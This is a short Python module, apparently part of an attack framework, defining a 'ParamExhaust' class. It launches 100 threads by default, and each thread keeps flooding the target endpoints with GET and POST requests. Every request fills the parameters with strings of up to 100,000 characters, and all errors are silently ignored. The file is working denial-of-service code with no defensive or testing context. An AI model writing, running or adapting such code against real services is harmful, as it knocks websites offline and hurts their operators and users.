import requests
import threading
import random
from .base import AttackBase

class ParamExhaust(AttackBase):
    def __init__(self, target, endpoints, threads=100, duration=60):
        super().__init__(target, duration)
        self.endpoints = endpoints  # list of (url, method, inputs)
        self.thread_count = threads

    def _start_threads(self):
        def worker():
            while self._running:
                for url, method, inputs in self.endpoints:
                    data = {}
                    for inp in inputs:
                        data[inp] = 'A' * random.randint(1000, 100000)  # huge value
                    try:
                        if method == 'POST':
                            requests.post(url, data=data, timeout=1)
                        else:
                            requests.get(url, params=data, timeout=1)
                    except:
                        pass

        for _ in range(self.thread_count):
            t = threading.Thread(target=worker)
            t.daemon = True
            self.threads.append(t)
            t.start()
